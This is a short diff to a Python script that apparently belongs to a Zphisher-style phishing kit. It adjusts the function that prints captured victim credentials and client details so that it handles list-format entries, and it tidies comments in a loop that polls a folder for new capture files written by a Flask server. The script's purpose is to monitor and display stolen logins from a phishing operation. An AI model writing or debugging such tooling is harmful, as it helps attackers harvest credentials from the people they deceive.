@@ -13,6 +13,12 @@ RESET = '\033[0m'
 
 def display_zphisher_style(entry, filename):
     """Print captured credentials in a clean, Zphisher-style format"""
+    # SAFEGUARD: Handle accidental list files from old runs
+    if isinstance(entry, list):
+        if len(entry) == 0:
+            return
+        entry = entry[-1]  # Grab the last captured credential in the list
+
     data = entry.get('data', {})
     client_info = entry.get('client_info', {})
     timestamp = entry.get('timestamp', 'N/A')
@@ -46,7 +52,6 @@ def monitor_credentials(site_name):
     print(f"\n{BOLD}{CYAN}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){RESET}")
     print(f"{YELLOW}Note: Every new capture will be printed instantly below{RESET}")
     
-    # Track successfully printed files so we don't repeat them
     processed_files = set()
 
     try:
@@ -57,7 +62,6 @@ def monitor_credentials(site_name):
                     if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking'):
                         current_files.add(f)
             
-            # Find brand new files that haven't been processed yet
             new_files = current_files - processed_files
             
             for filename in new_files:
@@ -66,13 +70,12 @@ def monitor_credentials(site_name):
                     with open(filepath, 'r', encoding='utf-8') as f:
                         entry = json.load(f)
                     
-                    # If we made it here, file is fully written. Print it!
+                    # Print it (the function safely handles Lists vs Dicts now)
                     display_zphisher_style(entry, filename)
                     processed_files.add(filename)
                     
                 except (json.JSONDecodeError, OSError):
-                    # File is still being written by Flask. 
-                    # Don't mark as processed yet. We'll retry it on the next scan.
+                    # File is still writing. Skip for now, will try again next loop
                     pass
             
             time.sleep(1)
